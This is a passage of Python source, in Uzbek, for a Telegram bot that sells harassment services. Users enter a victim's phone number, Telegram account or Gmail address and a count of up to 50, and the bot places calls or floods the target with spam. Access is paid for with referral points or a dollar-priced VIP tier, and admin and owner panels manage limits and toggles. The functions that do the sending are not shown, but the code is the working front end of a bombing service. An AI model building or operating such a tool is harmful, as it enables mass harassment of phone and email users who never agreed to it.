        logger.error(f"Ball o'tkazishda xatolik: {e}")

async def transfer_service_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        context.user_data['transfer_service'] = True
        context.user_data['transfer_step'] = 'waiting_service_id'
        keyboard = [[InlineKeyboardButton("🔙 Orqaga", callback_data="transfer_menu")]]
        await query.edit_message_text(
            f"💎 *Ballarni xizmatga o'tkazish*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ Foydalanuvchi ID sini yuboring\n"
            f"┃ 2️⃣ Xizmatni tanlang\n"
            f"┃ 3️⃣ Ballar sonini yuboring\n"
            f"┃\n"
            f"┃ ⚠️ Ballar foydalanuvchiga o'tkaziladi\n"
            f"┃ ⚠️ U ularni qo'shimcha urinishlarga ishlatishi mumkin\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📝 *Foydalanuvchi ID sini yuboring:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Xizmatga o'tkazishda xatolik: {e}")

async def redeem_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        points = get_user_points(user_id)
        
        if points <= 0:
            await query.edit_message_text("❌ Ballar yetarli emas!\n\n🎁 Do'stlarni taklif qilib ball yig'ing", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]]))
            return
        
        keyboard = [
            [InlineKeyboardButton("📞 Qo'ng'iroq (1 ball)", callback_data="redeem_call")],
            [InlineKeyboardButton("🌏 Osiyo spami (1 ball)", callback_data="redeem_spam_asia")],
            [InlineKeyboardButton("🔥 Ether spami (1 ball)", callback_data="redeem_spam_ether")],
            [InlineKeyboardButton("📱 Telegram spami (1 ball)", callback_data="redeem_spam_telegram")],
            [InlineKeyboardButton("✉️ Gmail spami (1 ball)", callback_data="redeem_spam_email")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]
        ]
        
        await query.edit_message_text(
            f"💎 *Ballarni almashtirish*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💰 Balansingiz : {points} ball\n"
            f"┃ ⭐ 1 ball = 1 qo'shimcha urinish\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📌 *Xizmatni tanlang:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Almashtirish menyusida xatolik: {e}")

async def redeem_service(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        service = query.data.replace('redeem_', '')
        user_id = query.from_user.id
        points = get_user_points(user_id)
        
        if points < 1:
            await query.answer("❌ Ballar yetarli emas!", show_alert=True)
            return
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('UPDATE users SET extra_tokens = extra_tokens + 1, extra_tokens_expiry = ? WHERE user_id = ?',
                     ((datetime.now() + timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S'), user_id))
            c.execute('UPDATE users SET points = points - 1 WHERE user_id = ?', (user_id,))
            conn.commit()
            conn.close()
        
        service_names = {"call": "Qo'ng'iroq", "spam_asia": "Osiyo spami", "spam_ether": "Ether spami", "spam_telegram": "Telegram spami", "spam_email": "Gmail spami"}
        points_after = get_user_points(user_id)
        extra = get_extra_tokens(user_id)
        
        await query.answer(f"✅ Ball almashtirildi! Endi {extra} qo'shimcha urinishingiz bor", show_alert=True)
        await query.edit_message_text(
            f"✅ *Ball muvaffaqiyatli almashtirildi!*\n\n"
            f"📞 Xizmat: {service_names.get(service, service)}\n"
            f"💎 Qolgan ballar: {points_after}\n"
            f"⭐ Qo'shimcha urinishlar: {extra}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Xizmatlarga qaytish", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Xizmat almashtirishda xatolik: {e}")

# ========== Qo'ng'iroq funksiyalari ==========
async def call_menu_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if not BUTTONS_STATUS.get("call", True):
            await query.edit_message_text("🔴 Qo'ng'iroq xizmati ta'mirda", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]]))
            return
        
        can, remaining = can_use_service(user_id, "call")
        if not can:
            await query.edit_message_text(f"❌ Bugungi bepul urinishlar tugadi!\n\n💎 Qo'shimcha urinishlar uchun ballarni almashtiring\n💰 Ballaringiz: {get_user_points(user_id)}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Ballarni almashtirish", callback_data="redeem_menu")], [InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]]))
            return
        
        context.user_data['call_step'] = 'waiting_phone'
        await query.edit_message_text(
            f"📞 *Qo'ng'iroq xizmati*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📞 Qolgan urinishlar : {remaining}\n"
            f"┃ 💎 Ballaringiz : {get_user_points(user_id)}\n"
            f"┃ ⭐ Bepul: {get_service_limit(user_id, 'call') - get_extra_tokens(user_id)} urinish\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📱 *Raqamni xalqaro formatda yuboring*\n"
            f"Misol : +998901234567\n\n"
            f"⚠️ Har bir urinish uchun 1 ball yoki bepul urinish ishlatiladi",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bekor qilish", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Qo'ng'iroq menyusida xatolik: {e}")

async def get_call_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get('call_step') != 'waiting_phone':
            return
        
        phone = update.message.text.strip()
        if not phone.startswith('+'):
            await update.message.reply_text("❌ Raqam + bilan boshlanishi kerak\nMisol: +998901234567")
            return
        
        user_id = update.effective_user.id
        can, remaining = can_use_service(user_id, "call")
        
        if not can:
            await update.message.reply_text("❌ Urinishlar tugadi!\n\n💎 Qo'shimcha urinishlar uchun ballarni almashtiring", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Ballarni almashtirish", callback_data="redeem_menu")]]))
            return
        
        msg = await update.message.reply_text(f"📞 Qo'ng'iroq yuborilmoqda...\n📱 {phone}\n⏱ Iltimos kuting...")
        success, result_msg = await make_call(phone, user_id)
        
        if success:
            increment_used(user_id, "call")
            used = get_used_today(user_id, "call")
            limit = get_service_limit(user_id, "call")
            points_after = get_user_points(user_id)
            
            await msg.edit_text(
                f"✅ *Qo'ng'iroq muvaffaqiyatli yuborildi!*\n\n"
                f"📱 Raqam: {phone}\n"
                f"{result_msg}\n\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃ 📞 Ishlatilgan: {used}/{limit}\n"
                f"┃ 💎 Qolgan ballar: {points_after}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📞 Yangi qo'ng'iroq", callback_data="call_menu")], [InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]]),
                parse_mode='Markdown'
            )
        else:
            await msg.edit_text(f"❌ *Qo'ng'iroq yuborilmadi*\n\n📱 Raqam: {phone}\n{result_msg}\n\n⚠️ Hech qanday urinish ishlatilmadi", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📞 Qayta urinish", callback_data="call_menu")], [InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]]))
        
        context.user_data['call_step'] = None
    except Exception as e:
        logger.error(f"Qo'ng'iroq raqamini olishda xatolik: {e}")

# ========== Spam funksiyalari ==========
async def spam_menu_generic(update: Update, context: ContextTypes.DEFAULT_TYPE, spam_type, name, icon):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        service_map = {'ether': 'spam_ether', 'asia': 'spam_asia', 'telegram': 'spam_telegram', 'email': 'spam_email'}
        service = service_map.get(spam_type, 'spam_ether')
        
        if not BUTTONS_STATUS.get(service, True):
            await query.edit_message_text(f"🔴 {name} xizmati ta'mirda", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]]))
            return
        
        can, remaining = can_use_service(user_id, service)
        if not can:
            await query.edit_message_text(f"❌ {name} uchun bugungi bepul urinishlar tugadi!\n\n💎 Qo'shimcha urinishlar uchun ballarni almashtiring\n💰 Ballaringiz: {get_user_points(user_id)}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Ballarni almashtirish", callback_data="redeem_menu")], [InlineKeyboardButton("🔙 Orqaga", callback_data="services_menu")]]))
            return
        
        context.user_data['spam_type'] = spam_type
        context.user_data['spam_step'] = 'waiting_target'
        
        target_msg = "raqam (0siz):" if spam_type != 'email' else "email:"
        examples = {"ether": "Misol: 7870496251", "asia": "Misol: 7892909751", "telegram": "Misol: +9987892909751", "email": "Misol: example@gmail.com"}
        example = examples.get(spam_type, "Misol: 7870496251")
        
        await query.edit_message_text(
            f"{icon} *{name} xizmati*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💣 Qolgan urinishlar : {remaining}\n"
            f"┃ 💎 Ballaringiz : {get_user_points(user_id)}\n"
            f"┃ ⭐ Bepul: {get_service_limit(user_id, service) - get_extra_tokens(user_id)} urinish\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📱 *{target_msg} yuboring*\n"
            f"{example}\n\n"
            f"⚠️ Har bir spam uchun 1 ball yoki bepul urinish ishlatiladi",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bekor qilish", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Spam menyusida xatolik: {e}")

async def get_spam_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get('spam_step') != 'waiting_target':
            return
        
        target = update.message.text.strip().replace(' ', '')
        spam_type = context.user_data.get('spam_type')
        
        if spam_type == 'email':
            if '@' not in target:
                await update.message.reply_text("❌ Email noto'g'ri!")
                return
        else:
            if spam_type == 'telegram' and not target.startswith('+'):
                await update.message.reply_text("❌ Raqam + bilan boshlanishi kerak")
                return
        
        context.user_data['spam_target'] = target
        context.user_data['spam_step'] = 'waiting_count'
        
        await update.message.reply_text(
            f"🔢 *Spamni necha marta yuborish kerak?*\n\n"
            f"📱 Maqsad: {target}\n"
            f"📊 Maksimal: 50 marta\n\n"
            f"📝 *Raqamni yuboring (1-50)*\n\n"
            f"⚠️ Har bir spam uchun 1 urinish ishlatiladi",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bekor qilish", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Spam maqsadini olishda xatolik: {e}")

async def get_spam_count_execute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get('spam_step') != 'waiting_count':
            return
        
        try:
            count = int(update.message.text.strip())
            if count < 1 or count > 50:
                await update.message.reply_text("❌ Son 1 va 50 orasida bo'lishi kerak")
                return
        except:
            await update.message.reply_text("❌ To'g'ri son yuboring")
            return
        
        target = context.user_data['spam_target']
        spam_type = context.user_data.get('spam_type')
        user_id = update.effective_user.id
        
        service_map = {'ether': 'spam_ether', 'asia': 'spam_asia', 'telegram': 'spam_telegram', 'email': 'spam_email'}
        service = service_map.get(spam_type, 'spam_ether')
        
        can, remaining = can_use_service(user_id, service)
        if can is False or remaining < count:
            await update.message.reply_text(f"❌ Urinishlar yetarli emas!\nQolgan: {remaining}\nKerak: {count}\n\n💎 Qo'shimcha urinishlar uchun ballarni almashtiring", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Ballarni almashtirish", callback_data="redeem_menu")]]))
            return
        
        msg = await update.message.reply_text(f"🔄 {count} ta spam yuborilmoqda...\n📱 {target}\n⏱ Iltimos kuting...")
        
        loop = asyncio.get_event_loop()
        if spam_type == 'asia':
            context.user_data['spam_need_message'] = True
            context.user_data['spam_count'] = count
            context.user_data['spam_target'] = target
            await msg.edit_text(f"🌏 Osiyo spami\n\n📱 Raqam: {target}\n🔢 Soni: {count}\n\n📝 *Yubormoqchi bo'lgan xabarni yozing:*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bekor qilish", callback_data="services_menu")]]))
            return
        elif spam_type == 'ether':
            success, failed = await loop.run_in_executor(executor, send_ether_spam_real, target, count)
        elif spam_type == 'telegram':
            success, failed = await loop.run_in_executor(executor, send_telegram_spam_real, target, count)
        else:
            success, failed = await loop.run_in_executor(executor, send_gmail_spam_real, target, count)
        
        increment_used(user_id, service, count)
        used = get_used_today(user_id, service)
        limit = get_service_limit(user_id, service)
        points_after = get_user_points(user_id)
        
        total = success + failed
        success_percent = int(success / total * 100) if total > 0 else 0
        bar = "█" * int(20 * success / total) + "░" * (20 - int(20 * success / total)) if total > 0 else "░░░░░░░░░░░░░░░░░░░░"
        
        service_names = {"asia": "Osiyo", "ether": "Ether", "telegram": "Telegram", "email": "Gmail"}
        
        await msg.edit_text(
            f"✅ *{service_names.get(spam_type, '')} spami bajarildi!*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📱 Maqsad: {target}\n"
            f"┃ 🔢 Kerakli son: {count}\n"
            f"┃\n"
            f"┃ ✅ Muvaffaqiyatli: {success}\n"
            f"┃ ❌ Muvaffaqiyatsiz: {failed}\n"
            f"┃\n"
            f"┃ 📊 Muvaffaqiyat foizi: {success_percent}%\n"
            f"┃ [{bar}]\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┃ 📞 Ishlatilgan: {used}/{limit}\n"
            f"┃ 💎 Ballaringiz: {points_after}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Yana spam", callback_data=f"spam_{spam_type}_menu")], [InlineKeyboardButton("🔙 Xizmatlarga qaytish", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
        context.user_data['spam_step'] = None
    except Exception as e:
        logger.error(f"Spam sonini bajarishda xatolik: {e}")

async def get_asia_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.user_data.get('spam_need_message'):
            return
        
        message = update.message.text.strip()
        if not message:
            await update.message.reply_text("❌ To'g'ri xabar yuboring")
            return
        
        count = context.user_data.get('spam_count', 1)
        target = context.user_data.get('spam_target')
        user_id = update.effective_user.id
        service = "spam_asia"
        
        can, remaining = can_use_service(user_id, service)
        if can is False or remaining < count:
            await update.message.reply_text(f"❌ Urinishlar yetarli emas!\nQolgan: {remaining}\nKerak: {count}")
            return
        
        msg = await update.message.reply_text(f"🔄 {count} ta spam yuborilmoqda...\n📱 {target}\n📝 {message[:30]}...\n⏱ Iltimos kuting...")
        
        loop = asyncio.get_event_loop()
        success, failed = await loop.run_in_executor(executor, send_asia_spam_real, target, count, message)
        
        increment_used(user_id, service, count)
        used = get_used_today(user_id, service)
        limit = get_service_limit(user_id, service)
        points_after = get_user_points(user_id)
        
        total = success + failed
        success_percent = int(success / total * 100) if total > 0 else 0
        bar = "█" * int(20 * success / total) + "░" * (20 - int(20 * success / total)) if total > 0 else "░░░░░░░░░░░░░░░░░░░░"
        
        await msg.edit_text(
            f"✅ *Osiyo spami bajarildi!*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📱 Maqsad: {target}\n"
            f"┃ 🔢 Soni: {count}\n"
            f"┃ 📝 Xabar: {message[:50]}\n"
            f"┃\n"
            f"┃ ✅ Muvaffaqiyatli: {success}\n"
            f"┃ ❌ Muvaffaqiyatsiz: {failed}\n"
            f"┃\n"
            f"┃ 📊 Muvaffaqiyat foizi: {success_percent}%\n"
            f"┃ [{bar}]\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┃ 📞 Ishlatilgan: {used}/{limit}\n"
            f"┃ 💎 Ballaringiz: {points_after}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Yana spam", callback_data="spam_asia_menu")], [InlineKeyboardButton("🔙 Xizmatlarga qaytish", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
        context.user_data['spam_step'] = None
        context.user_data['spam_need_message'] = False
    except Exception as e:
        logger.error(f"Osiyo xabarini olishda xatolik: {e}")

# ========== VIP ==========
async def vip_menu_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user = query.from_user
        
        await context.bot.send_message(
            chat_id=user.id,
            text=f"✦ • ───────────────── • ✦\n"
                 f"👑 *VIP paket* 👑\n"
                 f"✦ • ───────────────── • ✦\n\n"
                 f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                 f"┃ ⭐ 1 kun = 1 dollar\n"
                 f"┃ ⭐ 3 kun = 3 dollar\n"
                 f"┃ ⭐ 7 kun = 6 dollar\n"
                 f"┃ ⭐ 30 kun = 20 dollar\n"
                 f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                 f"┃ *VIP afzalliklari:*\n"
                 f"┃ ✅ Cheksiz urinishlar\n"
                 f"┃ ✅ Bajarishda ustunlik\n"
                 f"┃ ✅ Shaxsiy texnik yordam\n"
                 f"┃ ✅ Barcha xizmatlar mavjud\n"
                 f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                 f"📩 *Buyurtma va aloqa:* @{PAYMENT_USERNAME}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 Egasi bilan bog'lanish", url=f"https://t.me/{PAYMENT_USERNAME}")]])
        )
        await query.edit_message_text("✅ VIP ma'lumotlari shaxsiy xabarga yuborildi", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]]))
    except Exception as e:
        logger.error(f"VIP menyusida xatolik: {e}")

# ========== Admin paneli ==========
async def admin_panel_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = query.from_user.id
        
        if not is_admin(user_id):
            await query.answer("🚫 Bu panel faqat adminlar uchun!", show_alert=True)
            return
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users'); total = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM users WHERE is_vip = 1'); vip = c.fetchone()[0]
            c.execute('SELECT SUM(points) FROM users'); total_points = c.fetchone()[0] or 0
            conn.close()
        
        keyboard = [
            [InlineKeyboardButton("📊 Statistika", callback_data="admin_stats")],
            [InlineKeyboardButton("👑 VIP qilish", callback_data="add_vip_admin")],
            [InlineKeyboardButton("➕ Ball qo'shish", callback_data="add_points_admin")],
            [InlineKeyboardButton("📢 Umumiy xabar", callback_data="broadcast_all")],
            [InlineKeyboardButton("🔒 Shaxsiy xabar", callback_data="broadcast_private")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"✦ • ───────────────── • ✦\n"
            f"👨‍💼 *Admin boshqaruv paneli* 👨‍💼\n"
            f"✦ • ───────────────── • ✦\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 👥 Jami foydalanuvchilar: {total}\n"
            f"┃ 👑 VIP a'zolar: {vip}\n"
            f"┃ 💎 Jami ballar: {total_points}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Admin panelida xatolik: {e}")

async def admin_stats_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users'); total = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM users WHERE is_vip = 1'); vip = c.fetchone()[0]
            c.execute('SELECT SUM(total_calls) FROM daily_stats'); all_calls = c.fetchone()[0] or 0
            c.execute('SELECT SUM(total_spam) FROM daily_stats'); all_spam = c.fetchone()[0] or 0
            c.execute('SELECT SUM(points) FROM users'); total_points = c.fetchone()[0] or 0
            c.execute('SELECT SUM(referral_count) FROM users'); total_refs = c.fetchone()[0] or 0
            today = datetime.now().strftime('%Y-%m-%d')
            c.execute('SELECT total_calls, total_spam FROM daily_stats WHERE date = ?', (today,))
            today_stats = c.fetchone()
            conn.close()
        
        keyboard = [[InlineKeyboardButton("🔙 Orqaga", callback_data="admin_panel")]]
        
        await query.edit_message_text(
            f"📊 *Bot statistikasi*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 👥 Foydalanuvchilar: {total}\n"
            f"┃ 👑 VIP: {vip}\n"
            f"┃ 💎 Jami ballar: {total_points}\n"
            f"┃ 🔗 Jami taklif qilinganlar: {total_refs}\n"
            f"┃ 📞 Bugungi qo'ng'iroqlar: {today_stats[0] if today_stats else 0}\n"
            f"┃ 💣 Bugungi spam: {today_stats[1] if today_stats else 0}\n"
            f"┃ 📞 Jami qo'ng'iroqlar: {all_calls}\n"
            f"┃ 💣 Jami spam: {all_spam}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Statistika ko'rsatishda xatolik: {e}")

async def add_points_admin_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.edit_message_text(
            f"➕ *Foydalanuvchiga ball qo'shish*\n\n"
            f"Buyruq:\n`/add_points <foydalanuvchi_id> <ball_soni>`\n\n"
            f"📝 Misollar:\n"
            f"• `/add_points 123456789 10` -> 10 ball qo'shadi\n"
            f"• `/add_points 123456789 -5` -> 5 ball ayiradi",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ball qo'shish funksiyasida xatolik: {e}")

async def add_vip_admin_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.edit_message_text(
            f"👑 *Foydalanuvchini VIP qilish*\n\n"
            f"Buyruq:\n`/add_vip <foydalanuvchi_id> <kun_soni>`\n\n"
            f"📝 Misol:\n"
            f"`/add_vip 123456789 7` -> 7 kunga VIP qiladi",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"VIP qilish funksiyasida xatolik: {e}")

# ========== Egasi paneli ==========
async def owner_panel_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = query.from_user.id
        
        if not is_owner(user_id):
            await query.answer("🚫 Bu panel faqat bot egasi uchun!", show_alert=True)
            return
        
        keyboard = [
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['call'] else RED} 📞 Qo'ng'iroq", callback_data="toggle_call")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_asia'] else RED} 🌏 Osiyo spami", callback_data="toggle_asia")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_ether'] else RED} 🔥 Ether spami", callback_data="toggle_ether")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_telegram'] else RED} 📱 Telegram spami", callback_data="toggle_telegram")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_email'] else RED} ✉️ Gmail spami", callback_data="toggle_email")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['referral'] else RED} 🎁 Ball yig'ish", callback_data="toggle_referral")],
            [InlineKeyboardButton("⚙️ Limitlarni o'zgartirish", callback_data="edit_limits")],
            [InlineKeyboardButton("👑 Admin qilish", callback_data="owner_add_admin")],
            [InlineKeyboardButton("📉 Adminlikdan chiqarish", callback_data="owner_remove_admin")],
            [InlineKeyboardButton("🔗 Majburiy kanal qo'shish", callback_data="owner_add_channel")],
            [InlineKeyboardButton("❌ Kanalni o'chirish", callback_data="owner_remove_channel")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]
        ]
        
        status_text = ""
        for service, status in BUTTONS_STATUS.items():
            name = {"call": "Qo'ng'iroq", "spam_asia": "Osiyo", "spam_ether": "Ether", "spam_telegram": "Telegram", "spam_email": "Gmail", "referral": "Ball yig'ish"}.get(service, service)
            status_text += f"┃ {name} : {'🟢 Ishlamoqda' if status else '🔴 Yopiq'}\n"
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT value FROM settings WHERE key = "limit_call"')
            r = c.fetchone()
            call_limit = int(r[0]) if r else DEFAULT_LIMITS["call"]
            conn.close()
        
        await query.edit_message_text(
            f"✦ • ───────────────── • ✦\n"
            f"⚡ *Egasi boshqaruv paneli* ⚡\n"
            f"✦ • ───────────────── • ✦\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"{status_text}"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┃ *Kundalik bepul limitlar:*\n"
            f"┃ 📞 Qo'ng'iroq: {call_limit}\n"
            f"┃ 🌏 Osiyo: {DEFAULT_LIMITS['spam_asia']}\n"
            f"┃ 🔥 Ether: {DEFAULT_LIMITS['spam_ether']}\n"
            f"┃ 📱 Telegram: {DEFAULT_LIMITS['spam_telegram']}\n"
            f"┃ ✉️ Gmail: {DEFAULT_LIMITS['spam_email']}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"💡 Limitlarni o'zgartirish uchun `/setlimit <xizmat> <son>` buyrug'idan foydalaning",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Egasi panelida xatolik: {e}")

# ========== Boshqaruv funksiyalari ==========
async def toggle_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["call"] = not BUTTONS_STATUS["call"]
    await update.callback_query.answer(f"{'Yoqildi' if BUTTONS_STATUS['call'] else 'Ochirildi'} qong'iroq")
    await owner_panel_func(update, context)

async def toggle_asia(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_asia"] = not BUTTONS_STATUS["spam_asia"]
    await update.callback_query.answer(f"{'Yoqildi' if BUTTONS_STATUS['spam_asia'] else 'Ochirildi'} Osiyo spami")
    await owner_panel_func(update, context)

async def toggle_ether(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_ether"] = not BUTTONS_STATUS["spam_ether"]
    await update.callback_query.answer(f"{'Yoqildi' if BUTTONS_STATUS['spam_ether'] else 'Ochirildi'} Ether spami")
    await owner_panel_func(update, context)

async def toggle_telegram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_telegram"] = not BUTTONS_STATUS["spam_telegram"]
    await update.callback_query.answer(f"{'Yoqildi' if BUTTONS_STATUS['spam_telegram'] else 'Ochirildi'} Telegram spami")
    await owner_panel_func(update, context)

async def toggle_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_email"] = not BUTTONS_STATUS["spam_email"]
    await update.callback_query.answer(f"{'Yoqildi' if BUTTONS_STATUS['spam_email'] else 'Ochirildi'} Gmail spami")
    await owner_panel_func(update, context)

async def toggle_referral(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["referral"] = not BUTTONS_STATUS["referral"]
    await update.callback_query.answer(f"{'Yoqildi' if BUTTONS_STATUS['referral'] else 'Ochirildi'} ball yig'ish")
    await owner_panel_func(update, context)

async def edit_limits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.edit_message_text(
            f"⚙️ *Kundalik bepul limitlarni o'zgartirish*\n\n"
            f"Buyruq: `/setlimit <xizmat> <son>`\n\n"
            f"*Mavjud xizmatlar:*\n"
            f"• `call` - Qo'ng'iroq\n"
            f"• `spam_asia` - Osiyo spami\n"
            f"• `spam_ether` - Ether spami\n"
            f"• `spam_telegram` - Telegram spami\n"
            f"• `spam_email` - Gmail spami\n\n"
            f"📝 Misollar:\n"
            f"• `/setlimit call 10`\n"
            f"• `/setlimit spam_asia 20`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="owner_panel")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Limitlarni o'zgartirishda xatolik: {e}")

async def back_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await show_main_menu(query.message, query.from_user.id, context)
    except Exception as e:
        logger.error(f"Orqaga qaytishda xatolik: {e}")

